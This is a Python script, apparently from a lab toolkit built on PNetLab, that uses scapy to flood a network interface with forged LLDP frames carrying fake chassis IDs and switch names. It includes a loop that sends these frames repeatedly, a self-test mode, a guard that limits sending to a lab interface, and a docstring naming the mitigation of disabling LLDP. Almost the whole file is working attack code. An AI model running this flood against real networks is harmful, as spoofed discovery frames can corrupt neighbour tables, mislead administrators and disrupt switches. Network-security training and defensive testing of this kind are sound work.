#!/usr/bin/env python3
"""STP/DISCOVERY: flood forged LLDP TLVs — the vendor-neutral twin of the CDP
flood. Mitigation: disable LLDP globally or per-interface (see README)."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, forged_mac  # noqa: E402


def build_lldp(scapy_all, chassis_id, system_name, n):
    import scapy.contrib.lldp as lldp
    Ether = scapy_all.Ether
    # A valid (non-zero) source MAC is required or the PNetLab link bridge drops
    # the frame before forwarding it to the neighbour — see common.forged_mac().
    frame = (Ether(dst="01:80:c2:00:00:0e", src=forged_mac()) /
             lldp.LLDPDUChassisID(subtype="locally assigned", id=("%s-%d" % (chassis_id, n)).encode()) /
             lldp.LLDPDUPortID(subtype="interface name", id=b"eth1") /
             lldp.LLDPDUTimeToLive(ttl=120) /
             lldp.LLDPDUSystemName(system_name=system_name.encode()) /
             lldp.LLDPDUEndOfLLDPDU())
    return frame


def main():
    p = base_parser("Flood forged LLDP TLVs")
    p.add_argument("--chassis_id", default="fake-chassis")
    p.add_argument("--system_name", default="fake-switch")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_lldp(scapy_all, args.chassis_id, args.system_name, 0)
    if args.selftest:
        selftest_ok("lldp_flood", "LLDP frame len=%d" % len(bytes(pkt)))
        return

    def send(n):
        scapy_all.sendp(build_lldp(scapy_all, args.chassis_id, args.system_name, n), iface=args.iface, verbose=0)
        status("SENT", "LLDP #%d chassis-id=%s-%d system-name=%r" % (n + 1, args.chassis_id, n, args.system_name))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

